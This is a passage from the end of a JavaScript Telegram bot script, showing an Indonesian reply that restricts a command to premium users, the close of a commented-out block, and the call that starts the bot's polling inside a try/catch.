      bot.sendMessage(chatId, 'Maaf, hanya pengguna premium yang dapat menggunakan perintah ini.');
    }
  });

*/




  // Jalankan bot
  bot.startPolling();
} catch (error) {
  console.error('Error:', error);
}
